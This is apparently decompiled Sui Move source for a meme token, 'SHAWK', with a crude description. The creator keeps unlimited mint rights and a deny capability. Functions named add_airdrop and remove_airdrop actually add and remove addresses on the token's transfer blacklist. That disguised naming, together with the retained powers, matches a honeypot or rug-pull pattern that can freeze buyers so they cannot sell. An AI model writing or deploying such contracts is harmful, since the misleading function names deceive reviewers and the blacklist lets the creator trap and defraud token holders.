module 0x4e2544cad03d05556ed6efe20dd6c7e03690ae2a1c0a9d5f99c57bca3c38c732::SHAWK {
    struct SHAWK has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SHAWK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SHAWK>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SHAWK, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SHAWK>(arg0, 6, b"SHAWK", b"Sui Shawk", b"IT'S A FUCKING SHAWK EATS ALL THE OTHER FWISHES", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmQLPRtudFFukMXFGtrSRFPQACXZ8L6xnw32cDyD8cFRPf?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SHAWK>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<SHAWK>>(0x2::coin::mint<SHAWK>(&mut v3, 100000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SHAWK>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SHAWK>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SHAWK>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SHAWK>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

